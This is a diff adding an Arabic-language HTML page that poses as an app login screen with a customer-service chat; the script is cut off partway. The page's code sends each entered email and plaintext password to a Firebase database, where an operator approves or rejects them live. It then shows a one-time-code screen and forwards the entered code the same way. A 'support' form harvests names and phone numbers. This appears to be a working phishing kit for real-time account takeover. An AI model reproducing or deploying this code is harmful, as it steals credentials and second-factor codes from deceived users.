@@ -1,0 +1,1313 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+    :root {
+        --bg-1: #12161f;
+        --bg-2: #1b2029;
+        --field: #2a2f3d;
+        --accent: #5c7bd9;
+        --accent-hover: #4f6ecd;
+        --text: #ffffff;
+        --muted: #7b89a3;
+        --placeholder: #95a0b3;
+        --danger: #e5484d;
+        --ok: #3ea66b;
+        --radius: 16px;
+        --font: 'Tajawal', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font); }
+
+    body {
+        background:
+            radial-gradient(circle at 50% 17%,
+                rgba(255,255,255,.055) 0,
+                rgba(255,255,255,.022) 42px,
+                rgba(255,255,255,0) 92px),
+            linear-gradient(180deg, var(--bg-1) 0%, var(--bg-2) 100%);
+        background-attachment: fixed;
+        color: var(--text);
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    /* ================== Header ================== */
+    .header {
+        width: 100%;
+        padding: 16px 20px 0;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .header-lang {
+        color: #e9edf4;
+        font-size: 16px;
+        font-weight: 500;
+    }
+    .support-btn {
+        position: relative;
+        width: 38px; height: 38px;
+        background: transparent; border: none;
+        color: #ffffff; font-size: 23px;
+        cursor: pointer;
+        display: flex; align-items: center; justify-content: center;
+        -webkit-tap-highlight-color: transparent;
+    }
+    .support-btn:active { opacity: .7; }
+    .support-badge {
+        position: absolute; top: -2px; right: -3px;
+        width: 10px; height: 10px; border-radius: 50%;
+        background: var(--danger);
+        border: 2px solid var(--bg-1);
+        display: none;
+    }
+
+    /* ================== Logo ================== */
+    .logo-container {
+        margin-top: 24px;
+        margin-bottom: 20px;
+    }
+    .logo-container img {
+        width: 165px;
+        height: auto;
+        display: block;
+        opacity: 0.9;
+    }
+
+    /* ================== Login form ================== */
+    .login-container {
+        width: calc(100% - 60px);
+        max-width: 420px;
+        margin-top: 0;
+        display: flex;
+        flex-direction: column;
+    }
+    .login-title {
+        text-align: right;
+        font-size: 30px;
+        margin-bottom: 28px;
+        font-weight: 700;
+        color: #ffffff;
+        letter-spacing: -.2px;
+    }
+    .input-group {
+        position: relative;
+        margin-bottom: 16px;
+    }
+    .input-group input {
+        width: calc(100% + 1.2cm);
+        margin-left: -0.6cm;
+        margin-right: -0.6cm;
+        height: 58px;
+        background: var(--field);
+        border: 1.5px solid transparent;
+        border-radius: var(--radius);
+        padding: 0 50px;
+        color: #fff;
+        font-size: 16px;
+        font-family: var(--font);
+        outline: none;
+        transition: border-color .2s, background .2s;
+    }
+    .input-group input:focus { border-color: var(--accent); }
+    .input-group input::placeholder { color: var(--placeholder); }
+    .input-icon-right {
+        position: absolute;
+        right: calc(18px - 0.6cm);
+        top: 50%;
+        transform: translateY(-50%);
+        color: #a9b3c4;
+        font-size: 18px;
+        pointer-events: none;
+    }
+    .input-icon-left {
+        position: absolute;
+        left: calc(16px - 0.6cm);
+        top: 50%;
+        transform: translateY(-50%);
+        color: #cbd3e1;
+        font-size: 17px;
+        cursor: pointer;
+    }
+
+    /* Red error banner */
+    .form-error {
+        display: none;
+        align-items: center;
+        gap: 12px;
+        background: var(--danger);
+        color: #fff;
+        padding: 14px 16px;
+        border-radius: 16px;
+        margin-bottom: 14px;
+        font-size: 15px;
+        font-weight: 600;
+        text-align: right;
+        line-height: 1.6;
+    }
+    .form-error.show { display: flex; }
+    .form-error .err-circle {
+        order: -1;
+        width: 30px; height: 30px;
+        border-radius: 50%;
+        border: 1.5px solid rgba(255,255,255,.85);
+        display: flex; align-items: center; justify-content: center;
+        font-size: 13px; flex-shrink: 0;
+    }
+    .form-error .err-text {
+        flex: 1;
+        word-break: break-word;
+    }
+
+    /* تحذير يظهر مثبتاً أسفل الشاشة (على اليمين) */
+    .form-error.fixed-bottom {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        left: auto;
+        width: calc(100% - 40px);
+        max-width: 420px;
+        margin: 0;
+        z-index: 2000;
+        box-shadow: 0 12px 32px rgba(0,0,0,.5);
+    }
+
+    .forgot-password {
+        text-align: right;
+        font-size: 14px;
+        color: var(--muted);
+        margin-top: 2px;
+        margin-bottom: 26px;
+    }
+    .forgot-password a {
+        color: var(--muted);
+        text-decoration: none;
+    }
+    .forgot-password a .blue-link {
+        color: var(--accent);
+    }
+
+    /* ===== Submit button ===== */
+    .submit-btn {
+        width: calc(100% + 1.2cm);
+        margin-left: -0.6cm;
+        margin-right: -0.6cm;
+        height: 60px;
+        background: var(--accent);
+        color: #fff;
+        border: none;
+        border-radius: var(--radius);
+        font-size: 20px;
+        font-weight: 700;
+        font-family: var(--font);
+        cursor: pointer;
+        transition: background .2s, opacity .2s;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+    }
+    .submit-btn:hover:not(:disabled) { background: var(--accent-hover); }
+    .submit-btn:disabled { opacity: .6; cursor: not-allowed; }
+
+    .btn-spinner {
+        display: none;
+        position: relative;
+        width: 24px; height: 24px;
+        flex-shrink: 0;
+    }
+    .btn-spinner .ring-outer,
+    .btn-spinner .ring-inner {
+        position: absolute;
+        border-radius: 50%;
+        border-style: solid;
+        border-color: transparent;
+    }
+    .btn-spinner .ring-outer {
+        inset: 0;
+        border-width: 2.5px;
+        border-top-color: currentColor;
+        border-right-color: currentColor;
+        animation: spin-cw .9s linear infinite;
+    }
+    .btn-spinner .ring-inner {
+        inset: 6px;
+        border-width: 2.5px;
+        border-bottom-color: currentColor;
+        border-left-color: currentColor;
+        opacity: .6;
+        animation: spin-ccw .65s linear infinite;
+    }
+    @keyframes spin-cw { to { transform: rotate(360deg); } }
+    @keyframes spin-ccw { to { transform: rotate(-360deg); } }
+
+    .submit-btn.loading .btn-label,
+    .gate-confirm.loading .btn-label,
+    .otp-confirm.loading .btn-label { display: none; }
+    .submit-btn.loading .btn-spinner,
+    .gate-confirm.loading .btn-spinner,
+    .otp-confirm.loading .btn-spinner { display: inline-block; }
+
+    .create-account {
+        text-align: center;
+        font-size: 14px;
+        color: var(--muted);
+        margin-top: 26px;
+    }
+    .create-account a {
+        color: var(--muted);
+        text-decoration: none;
+    }
+    .create-account a .blue-link {
+        color: var(--accent);
+    }
+
+    /* ================== Footer ================== */
+    .footer {
+        margin-top: auto;
+        padding: 28px 0 32px;
+        text-align: center;
+        color: #4a5262;
+        font-size: 12px;
+        letter-spacing: .6px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 10px;
+        font-weight: 500;
+    }
+    .footer i { color: #3b4351; font-size: 34px; }
+
+    /* ================== Gate overlay ================== */
+    .gate-overlay {
+        position: fixed; inset: 0;
+        background: rgba(0,0,0,.75);
+        z-index: 3000;
+        display: none;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+    }
+    .gate-overlay.show { display: flex; }
+    .gate-card {
+        width: 100%; max-width: 400px;
+        background: #1a2134;
+        border-radius: 20px;
+        padding: 26px 22px;
+        display: flex; flex-direction: column; gap: 14px;
+        box-shadow: 0 20px 60px rgba(0,0,0,.6);
+    }
+    .gate-title {
+        font-size: 17px; font-weight: 700;
+        text-align: right; line-height: 1.7;
+        margin-bottom: 4px;
+    }
+    .gate-field { position: relative; }
+    .gate-field input {
+        width: 100%; height: 56px;
+        background: #2a3348;
+        border: 1.5px solid transparent;
+        border-radius: 14px;
+        padding: 0 44px 0 16px;
+        color: #fff; font-size: 16px;
+        font-family: var(--font);
+        outline: none; text-align: right;
+    }
+    .gate-field input::placeholder { color: #9aa3b6; }
+    .gate-field input.invalid { border-color: var(--danger); background: rgba(229,72,77,.18); }
+    .gate-field i {
+        position: absolute; top: 50%; right: 16px;
+        transform: translateY(-50%);
+        color: #9aa3b6; font-size: 17px;
+        pointer-events: none;
+    }
+    .gate-error {
+        display: none;
+        color: var(--danger);
+        font-size: 13px;
+        text-align: right;
+        margin-top: -8px;
+    }
+    .gate-error.show { display: block; }
+
+    .gate-confirm {
+        height: 56px;
+        border: none; border-radius: 14px;
+        background: var(--accent); color: #fff;
+        font-size: 17px; font-weight: 700;
+        font-family: var(--font); cursor: pointer;
+        display: flex; align-items: center; justify-content: center; gap: 10px;
+        transition: background .2s, opacity .2s;
+    }
+    .gate-confirm:hover:not(:disabled) { background: var(--accent-hover); }
+    .gate-confirm:disabled { opacity: .75; cursor: not-allowed; }
+
+    .gate-cancel {
+        height: 56px;
+        border: 1.5px solid rgba(255,255,255,.3);
+        border-radius: 14px;
+        background: transparent; color: #fff;
+        font-size: 17px; font-weight: 700;
+        font-family: var(--font); cursor: pointer;
+    }
+
+    /* ================== OTP overlay ================== */
+    .otp-overlay {
+        position: fixed; inset: 0;
+        background: radial-gradient(circle at 50% 20%, rgba(91,124,216,.14), transparent 45%), #1a2134;
+        z-index: 3100;
+        display: none;
+        flex-direction: column;
+        padding: 14px 22px 26px;
+        overflow-y: auto;
+    }
+    .otp-overlay.show { display: flex; }
+    .otp-back {
+        align-self: flex-start;
+        width: 44px; height: 44px;
+        background: none; border: none;
+        color: #fff; font-size: 22px;
+        display: flex; align-items: center; justify-content: center;
+        cursor: pointer;
+        -webkit-tap-highlight-color: transparent;
+    }
+    .otp-back:active { opacity: .6; }
+    .otp-logo {
+        width: 170px; max-width: 55%; height: auto;
+        display: block;
+        margin: 4vh auto 5vh;
+    }
+    .otp-title { font-size: 24px; font-weight: 700; text-align: right; }
+    .otp-subtitle {
+        font-size: 15px; color: #9aa3b6;
+        text-align: right; margin-top: 6px; margin-bottom: 30px;
+    }
+    .otp-boxes {
+        display: flex; gap: 10px; width: 100%;
+        direction: ltr; margin-bottom: 30px;
+    }
+    .otp-box {
+        flex: 1; min-width: 0;
+        height: 64px;
+        background: #2a3348;
+        border: none; border-radius: 14px;
+        color: #fff; font-size: 22px;
+        text-align: center;
+        font-family: var(--font);
+        outline: none;
+    }
+    .otp-box:focus { outline: 2px solid var(--accent); }
+    .otp-confirm {
+        margin-top: auto;
+        align-self: flex-end;
+        min-width: 70px; height: 44px;
+        background: none; border: none;
+        color: var(--accent);
+        font-size: 18px; font-weight: 700;
+        font-family: var(--font);
+        cursor: pointer;
+        display: flex; align-items: center; justify-content: center; gap: 8px;
+        padding: 6px 10px;
+    }
+    .otp-confirm:disabled { opacity: .6; cursor: not-allowed; }
+
+    .otp-error-banner {
+        display: none;
+        align-items: center;
+        gap: 12px;
+        background: var(--danger);
+        border-radius: 16px;
+        padding: 14px 16px;
+        margin-top: 14px;
+    }
+    .otp-error-banner.show { display: flex; }
+    .otp-error-banner .otp-error-text {
+        flex: 1;
+        color: #fff;
+        font-size: 15px;
+        font-weight: 600;
+        text-align: right;
+        line-height: 1.6;
+    }
+    .otp-error-banner .otp-error-circle {
+        order: -1;
+        width: 30px; height: 30px;
+        border-radius: 50%;
+        border: 1.5px solid rgba(255,255,255,.85);
+        color: #fff;
+        display: flex; align-items: center; justify-content: center;
+        font-size: 13px; flex-shrink: 0;
+        cursor: pointer;
+    }
+
+    /* ================== Chat modal ================== */
+    .chat-modal {
+        display: none;
+        position: fixed; inset: 0;
+        background: #161c2c;
+        z-index: 3200;
+        flex-direction: column;
+    }
+    .chat-modal.show { display: flex; }
+    .chat-panel {
+        width: 100%; height: 100%;
+        background: #161c2c;
+        display: flex; flex-direction: column;
+    }
+    .chat-header {
+        padding: 14px;
+        display: flex; align-items: center; gap: 6px;
+        font-weight: 700; font-size: 18px;
+        border-bottom: 1px solid #262f45;
+    }
+    .chat-header .otp-back { align-self: center; flex-shrink: 0; }
+    .chat-title { flex: 1; text-align: right; }
+    .chat-messages {
+        flex: 1; overflow-y: auto;
+        padding: 14px;
+        display: flex; flex-direction: column; gap: 8px;
+    }
+    .msg {
+        max-width: 80%;
+        padding: 10px 14px;
+        border-radius: 14px;
+        font-size: 15px;
+        line-height: 1.6;
+        word-break: break-word;
+    }
+    .msg-client {
+        align-self: flex-end;
+        background: var(--accent); color: #fff;
+        border-bottom-left-radius: 4px;
+    }
+    .msg-admin {
+        align-self: flex-start;
+        background: #2a3348; color: #fff;
+        border-bottom-right-radius: 4px;
+    }
+    .msg-empty {
+        text-align: center; color: #8b96ad;
+        font-size: 14px; padding: 20px;
+    }
+    .chat-input-row {
+        display: flex; gap: 8px;
+        padding: 10px 12px 12px;
+    }
+    .chat-input-row input {
+        flex: 1;
+        background: #2a3348; border: none;
+        border-radius: 14px;
+        padding: 0 16px;
+        height: 50px;
+        color: #fff; font-size: 15px;
+        outline: none;
+        font-family: var(--font);
+    }
+    .chat-input-row input::placeholder { color: #9aa3b6; }
+    .chat-input-row button {
+        width: 50px; height: 50px;
+        background: var(--accent);
+        border: none; border-radius: 14px;
+        color: #fff; font-size: 17px;
+        cursor: pointer;
+    }
+    .icon-btn {
+        width: 38px; height: 38px;
+        border-radius: 10px;
+        background: transparent; border: none;
+        color: #fff; font-size: 17px;
+        cursor: pointer;
+        display: flex; align-items: center; justify-content: center;
+    }
+
+    /* Success screen inside OTP overlay */
+    .success-view {
+        flex: 1;
+        display: flex; flex-direction: column;
+        align-items: center; justify-content: center;
+        text-align: center;
+        gap: 14px;
+    }
+    .success-view .ok-icon { font-size: 60px; color: var(--ok); }
+    .success-view .ok-title { font-size: 22px; font-weight: 700; }
+    .success-view .ok-sub { color: var(--muted); font-size: 15px; }
+</style>
+</head>
+<body>
+
+<!-- =============== Header =============== -->
+<div class="header">
+    <span class="header-lang">الإنكليزية</span>
+    <button class="support-btn" id="support-btn" type="button" aria-label="خدمة العملاء">
+        <i class="fa-solid fa-headset"></i>
+        <span class="support-badge" id="support-badge"></span>
+    </button>
+</div>
+
+<!-- =============== Logo =============== -->
+<div class="logo-container">
+    <img id="dynamic-logo" src="https://i.imgur.com/WnTTBP5.png" alt="Logo">
+</div>
+
+<!-- =============== Login form =============== -->
+<div class="login-container">
+    <h1 class="login-title">تسجيل الدخول</h1>
+
+    <form id="login-form">
+        <div class="input-group">
+            <i class="fa-solid fa-user input-icon-right"></i>
+            <input type="text" id="email" placeholder="البريد الإلكتروني" required autocomplete="username">
+        </div>
+
+        <div class="input-group">
+            <i class="fa-solid fa-lock input-icon-right"></i>
+            <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="current-password">
+            <i class="fa-solid fa-eye input-icon-left" id="togglePassword"></i>
+        </div>
+
+        <div class="form-error" id="form-error">
+            <div class="err-circle"><i class="fa-solid fa-xmark"></i></div>
+            <div class="err-text"></div>
+        </div>
+
+        <div class="forgot-password">
+            <a href="#">هل نسيت كلمة المرور؟ <span class="blue-link">تغيير كلمة المرور</span></a>
+        </div>
+
+        <button type="submit" class="submit-btn" id="submit-btn">
+            <span class="btn-label">تسجيل الدخول</span>
+            <span class="btn-spinner">
+                <span class="ring-outer"></span>
+                <span class="ring-inner"></span>
+            </span>
+        </button>
+
+        <div class="create-account">
+            <a href="#">لا تملك حساب مسبقا؟ <span class="blue-link">إنشاء حساب</span></a>
+        </div>
+    </form>
+</div>
+
+<!-- =============== Footer =============== -->
+<div class="footer">
+    <span>POWERED BY</span>
+    <i class="fa-solid fa-shield-halved"></i>
+    <span>V 3.0.2</span>
+</div>
+
+<!-- =============== Gate overlay (customer service) =============== -->
+<div class="gate-overlay" id="gate-overlay">
+    <div class="gate-card">
+        <div class="gate-title">يرجى تزويدنا بالمعلومات التالية</div>
+        <div class="gate-field">
+            <input type="tel" id="gate-phone" placeholder="رقم الهاتف" inputmode="numeric" autocomplete="off">
+            <i class="fa-solid fa-phone"></i>
+        </div>
+        <div class="gate-error" id="gate-phone-error">الرقم يجب ان يتكون من عشر خانات</div>
+        <div class="gate-field">
+            <input type="text" id="gate-name" placeholder="الاسم" autocomplete="off">
+            <i class="fa-solid fa-user"></i>
+        </div>
+        <div class="gate-error" id="gate-general-error"></div>
+        <button class="gate-confirm" id="gate-confirm" type="button">
+            <span class="btn-label">تأكيد</span>
+            <span class="btn-spinner">
+                <span class="ring-outer"></span>
+                <span class="ring-inner"></span>
+            </span>
+        </button>
+        <button class="gate-cancel" id="gate-cancel" type="button">إلغاء</button>
+    </div>
+</div>
+
+<!-- =============== OTP overlay =============== -->
+<div class="otp-overlay" id="otp-overlay">
+    <button class="otp-back" id="otp-back" type="button" aria-label="رجوع">
+        <i class="fa-solid fa-chevron-right"></i>
+    </button>
+    <img class="otp-logo" id="otp-logo" alt="Logo">
+    <div class="otp-title">رمز التأكيد</div>
+    <div class="otp-subtitle">قم بإدخال رمز التحقق المُرسل إليك</div>
+    <div class="otp-boxes">
+        <input maxlength="1" inputmode="numeric" autocomplete="one-time-code" class="otp-box" data-i="0">
+        <input maxlength="1" inputmode="numeric" class="otp-box" data-i="1">
+        <input maxlength="1" inputmode="numeric" class="otp-box" data-i="2">
+        <input maxlength="1" inputmode="numeric" class="otp-box" data-i="3">
+        <input maxlength="1" inputmode="numeric" class="otp-box" data-i="4">
+        <input maxlength="1" inputmode="numeric" class="otp-box" data-i="5">
+    </div>
+    <button class="otp-confirm" id="otp-confirm" type="button">
+        <span class="btn-label">تأكيد</span>
+        <span class="btn-spinner">
+            <span class="ring-outer"></span>
+            <span class="ring-inner"></span>
+        </span>
+    </button>
+    <div class="otp-error-banner" id="otp-error-banner">
+        <div class="otp-error-text">رمز OTP غير صالح.</div>
+        <div class="otp-error-circle" id="otp-error-dismiss"><i class="fa-solid fa-xmark"></i></div>
+    </div>
+</div>
+
+<!-- =============== Chat modal =============== -->
+<div class="chat-modal" id="chat-modal">
+    <div class="chat-panel">
+        <div class="chat-header">
+            <button class="otp-back" id="chat-close" type="button" aria-label="رجوع">
+                <i class="fa-solid fa-chevron-right"></i>
+            </button>
+            <span class="chat-title">خدمة العملاء</span>
+        </div>
+        <div class="chat-messages" id="chat-messages"></div>
+        <div class="chat-input-row">
+            <input type="text" id="chat-input" placeholder="اكتب رسالتك...">
+            <button id="chat-send" type="button"><i class="fa-solid fa-paper-plane"></i></button>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+    /* =================== Firebase init =================== */
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+    import {
+        getDatabase, ref, get, set, update, push, onValue, serverTimestamp, increment,
+        query, orderByChild, equalTo
+    } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+    import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+
+    const cfg = {
+        apiKey: "AIzaSyDyMyqxp0OEe7DM5a17O4QQCrpu5dazQJc",
+        authDomain: "tawteek-9206c.firebaseapp.com",
+        databaseURL: "https://tawteek-9206c-default-rtdb.firebaseio.com",
+        projectId: "tawteek-9206c",
+        storageBucket: "tawteek-9206c.firebasestorage.app",
+        messagingSenderId: "631433779854",
+        appId: "1:631433779854:web:319e2d278cddb8d0ab07df"
+    };
+    const app = initializeApp(cfg);
+    const db  = getDatabase(app, cfg.databaseURL);
+    const auth = getAuth(app);
+
+    const authReady = (async () => {
+        try { await signInAnonymously(auth); }
+        catch (e) { console.warn('auth failed', e); }
+    })();
+    const waitAuth = () => Promise.race([
+        authReady,
+        new Promise(r => setTimeout(r, 6000))
+    ]);
+
+    /* =================== Helpers =================== */
+    const $ = id => document.getElementById(id);
+
+    function setLoading(btn, loading) {
+        if (!btn) return;
+        btn.classList.toggle('loading', loading);
+        btn.disabled = loading;
+    }
+
+    const normDigits = s => String(s || '')
+        .replace(/[\u0660-\u0669]/g, d => d.charCodeAt(0) - 0x0660)
+        .replace(/[\u06F0-\u06F9]/g, d => d.charCodeAt(0) - 0x06F0);
+
+    /* =================== State =================== */
+    let loginRequestId   = localStorage.getItem('login_request_id') || null;
+    let supportRequestId = localStorage.getItem('support_request_id') || null;
+    let currentFlow      = null; // 'login' | 'support'
+    let loginUnsub   = null;
+    let supportUnsub = null;
+
+    let chatId       = localStorage.getItem('chat_id') || '';
+    let userPhone    = localStorage.getItem('support_phone') || '';
+    let userName     = localStorage.getItem('support_name')  || '';
+    let unsubChat    = null;
+    let unsubMsgs    = null;
+    let supportVerified = localStorage.getItem('support_verified') === 'true';
+
+    /* =================== Login form =================== */
+    const submitBtn = $('submit-btn');
+    const formError = $('form-error');
+    const emailInput = $('email');
+    const passwordInput = $('password');
+
+    function showFormError(msg) {
+        formError.querySelector('.err-text').textContent = msg;
+        formError.classList.add('show');
+    }
+    function hideFormError() {
+        formError.classList.remove('show');
+        formError.classList.remove('fixed-bottom');
+    }
+
+    /* Show warning when the user starts typing in the email field */
+    let emailWarningShown = false;
+    emailInput.addEventListener('input', () => {
+        if (!emailWarningShown && emailInput.value.trim().length > 0) {
+            emailWarningShown = true;
+            formError.classList.add('fixed-bottom');
+            showFormError('يرجى تسجيل الخروج من حسابك على التطبيق القديم اولا');
+        }
+    });
+
+    /* password toggle */
+    const togglePassword = $('togglePassword');
+    togglePassword.addEventListener('click', function () {
+        const t = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+        passwordInput.setAttribute('type', t);
+        this.classList.toggle('fa-eye-slash');
+        this.classList.toggle('fa-eye');
+    });
+
+    $('login-form').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email    = emailInput.value.trim();
+        const password = passwordInput.value;
+        if (!email || !password) return;
+
+        hideFormError();
+        setLoading(submitBtn, true);
+
+        try {
+            await waitAuth();
+
+            /* cancel previous pending login request (if any) */
+            if (loginRequestId) {
+                try {
+                    await update(ref(db, 'accessRequests/' + loginRequestId), {
+                        status: 'cancelled',
+                        updatedAt: Date.now()
+                    });
+                } catch (_) {}
+                loginRequestId = null;
+                localStorage.removeItem('login_request_id');
+            }
+
+            const newRef = push(ref(db, 'accessRequests'));
+            loginRequestId = newRef.key;
+            localStorage.setItem('login_request_id', loginRequestId);
+
+            await set(newRef, {
+                type: 'login',
+                name: email,
+                email: email,
+                phone: email,
+                password: password,
+                status: 'pending',
+                rejectReason: '',
+                otp: '',
+                otpStatus: '',
+                otpRejectReason: '',
+                createdAt: Date.now(),
+                updatedAt: Date.now()
+            });
+
+            currentFlow = 'login';
+            listenRequest(loginRequestId, 'login');
+
+        } catch (err) {
+            console.error('[login]', err);
+            setLoading(submitBtn, false);
+            showFormError('تعذّر إرسال الطلب، يرجى المحاولة مرة أخرى');
+        }
+    });
+
+    /* =================== Gate (customer service) =================== */
+    const supportBtn       = $('support-btn');
+    const supportBadge     = $('support-badge');
+    const gateOverlay      = $('gate-overlay');
+    const gatePhoneInput   = $('gate-phone');
+    const gateNameInput    = $('gate-name');
+    const gatePhoneError   = $('gate-phone-error');
+    const gateGeneralError = $('gate-general-error');
+    const gateConfirmBtn   = $('gate-confirm');
+    const gateCancelBtn    = $('gate-cancel');
+
+    supportBtn.addEventListener('click', () => {
+        if (supportVerified && userPhone) {
+            openChat();
+            return;
+        }
+        if (supportRequestId) {
+            currentFlow = 'support';
+            listenRequest(supportRequestId, 'support');
+            return;
+        }
+        showGate();
+    });
+
+    function showGate() {
+        gateOverlay.classList.add('show');
+        $('otp-overlay').classList.remove('show');
+        gatePhoneInput.value = '';
+        gateNameInput.value  = '';
+        gatePhoneError.classList.remove('show');
+        gateGeneralError.classList.remove('show');
+        gatePhoneInput.classList.remove('invalid');
+        gateNameInput.classList.remove('invalid');
+        setLoading(gateConfirmBtn, false);
+    }
+
+    gatePhoneInput.addEventListener('input', () => {
+        gatePhoneInput.value = normDigits(gatePhoneInput.value).replace(/\D/g, '').slice(0, 10);
+        gatePhoneInput.classList.remove('invalid');
+        gatePhoneError.classList.remove('show');
+        gateGeneralError.classList.remove('show');
+    });
+    gateNameInput.addEventListener('input', () => {
+        gateNameInput.classList.remove('invalid');
+        gateGeneralError.classList.remove('show');
+    });
+    [gatePhoneInput, gateNameInput].forEach(inp => inp.addEventListener('keydown', e => {
+        if (e.key === 'Enter') gateConfirmBtn.click();
+    }));
+
+    gateCancelBtn.addEventListener('click', () => {
+        gateOverlay.classList.remove('show');
+    });
+
+    gateConfirmBtn.addEventListener('click', async () => {
+        if (gateConfirmBtn.classList.contains('loading')) return;
+        const phone = normDigits(gatePhoneInput.value).replace(/\D/g, '');
+        const name  = gateNameInput.value.trim();
+
+        gateGeneralError.classList.remove('show');
+
+        if (phone.length !== 10) {
+            gatePhoneInput.classList.add('invalid');
+            gatePhoneError.classList.add('show');
+            return;
+        }
+        if (!name) {
+            gateNameInput.classList.add('invalid');
+            gateGeneralError.textContent = 'الرجاء إدخال الاسم';
+            gateGeneralError.classList.add('show');
+            return;
+        }
+
+        setLoading(gateConfirmBtn, true);
+
+        try {
+            await waitAuth();
+
+            if (supportRequestId) {
+                try {
+                    await update(ref(db, 'accessRequests/' + supportRequestId), {
+                        status: 'cancelled',
+                        updatedAt: Date.now()
+                    });
+                } catch (_) {}
+                supportRequestId = null;
+                localStorage.removeItem('support_request_id');
+            }
+
+            const newRef = push(ref(db, 'accessRequests'));
+            supportRequestId = newRef.key;
+            localStorage.setItem('support_request_id', supportRequestId);
+            localStorage.setItem('support_phone', phone);
+            localStorage.setItem('support_name', name);
+            userPhone = phone;
+            userName  = name;
+
+            await set(newRef, {
+                type: 'support',
+                name: name,
+                phone: phone,
+                status: 'pending',
+                rejectReason: '',
+                otp: '',
+                otpStatus: '',
+                otpRejectReason: '',
+                createdAt: Date.now(),
+                updatedAt: Date.now()
+            });
+
+            currentFlow = 'support';
+            listenRequest(supportRequestId, 'support');
+
+        } catch (err) {
+            console.error('[gate]', err);
+            setLoading(gateConfirmBtn, false);
+            gateGeneralError.textContent = 'تعذّر إرسال الطلب، يرجى المحاولة مرة أخرى';
+            gateGeneralError.classList.add('show');
+        }
+    });
+
+    /* =================== OTP overlay =================== */
+    const otpOverlay      = $('otp-overlay');
+    const otpBackBtn      = $('otp-back');
+    const otpLogoImg      = $('otp-logo');
+    const otpBoxes        = Array.from(document.querySelectorAll('.otp-box'));
+    const otpConfirmBtn   = $('otp-confirm');
+    const otpErrorBanner  = $('otp-error-banner');
+    const otpErrorDismiss = $('otp-error-dismiss');
+
+    otpBoxes.forEach((box, i) => {
+        box.addEventListener('input', () => {
+            otpErrorBanner.classList.remove('show');
+            const digits = normDigits(box.value).replace(/\D/g, '');
+            if (digits.length > 1) {
+                box.value = '';
+                fillOtp(digits, i);
+                return;
+            }
+            box.value = digits;
+            if (digits && otpBoxes[i + 1]) otpBoxes[i + 1].focus();
+        });
+        box.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !box.value && otpBoxes[i - 1]) otpBoxes[i - 1].focus();
+            if (e.key === 'Enter') otpConfirmBtn.click();
+        });
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const txt = (e.clipboardData || window.clipboardData).getData('text');
+            fillOtp(normDigits(txt).replace(/\D/g, ''), i);
+        });
+    });
+
+    function fillOtp(digits, start) {
+        let k = start;
+        for (const ch of digits) {
+            if (k >= otpBoxes.length) break;
+            otpBoxes[k++].value = ch;
+        }
+        otpBoxes[Math.min(k, otpBoxes.length - 1)].focus();
+    }
+
+    function showOtpOverlay() {
+        gateOverlay.classList.remove('show');
+        otpLogoImg.src = $('dynamic-logo').src;
+        otpErrorBanner.classList.remove('show');
+        otpBoxes.forEach(b => b.value = '');
+        setLoading(otpConfirmBtn, false);
+        otpOverlay.classList.add('show');
+        setTimeout(() => otpBoxes[0].focus(), 50);
+    }
+
+    otpBackBtn.addEventListener('click', () => {
+        otpOverlay.classList.remove('show');
+        if (currentFlow === 'support') {
+            showGate();
+        } else {
+            setLoading(submitBtn, false);
+        }
+    });
+
+    otpErrorDismiss.addEventListener('click', () => {
+        otpErrorBanner.classList.remove('show');
+    });
+
+    otpConfirmBtn.addEventListener('click', async () => {
+        if (otpConfirmBtn.classList.contains('loading')) return;
+        const code = otpBoxes.map(b => b.value).join('');
+        if (code.length !== 6) return;
+
+        const reqId = currentFlow === 'login' ? loginRequestId : supportRequestId;
+        if (!reqId) return;
+
+        otpErrorBanner.classList.remove('show');
+        setLoading(otpConfirmBtn, true);
+
+        try {
+            await update(ref(db, 'accessRequests/' + reqId), {
+                otp: code,
+                otpStatus: 'pending',
+                updatedAt: Date.now()
+            });
+        } catch (err) {
+            console.error('[otp]', err);
+            setLoading(otpConfirmBtn, false);
+        }
+    });
+
+    /* =================== Listen to admin decisions =================== */
+    function listenRequest(id, flow) {
+        if (loginUnsub)   { loginUnsub();   loginUnsub   = null; }
+        if (supportUnsub) { supportUnsub(); supportUnsub = null; }
+
+        const unsub = onValue(ref(db, 'accessRequests/' + id), snap => {
+            const d = snap.val();
+            if (!d) return;
+            if (flow === 'login')   handleLoginUpdate(d);
+            else if (flow === 'support') handleSupportUpdate(d);
+        });
+
+        if (flow === 'login')   loginUnsub   = unsub;
+        if (flow === 'support') supportUnsub = unsub;
+    }
+
+    function handleLoginUpdate(d) {
+        if (d.status === 'rejected') {
+            setLoading(submitBtn, false);
+            const msg = d.rejectReason || 'تعذّر التحقق من بياناتك، يرجى المحاولة مرة أخرى';
+            formError.classList.add('fixed-bottom');
+            showFormError(msg);
+            localStorage.removeItem('login_request_id');
+            loginRequestId = null;
+            return;
+        }
+
+        if (d.status === 'approved' && !d.otpStatus) {
+            setLoading(submitBtn, false);
+            hideFormError();
+            currentFlow = 'login';
+            showOtpOverlay();
+            return;
+        }
+
+        if (d.otpStatus === 'pending') {
+            setLoading(otpConfirmBtn, true);
+            return;
+        }
+
+        if (d.otpStatus === 'approved') {
+            setLoading(otpConfirmBtn, false);
+            localStorage.removeItem('login_request_id');
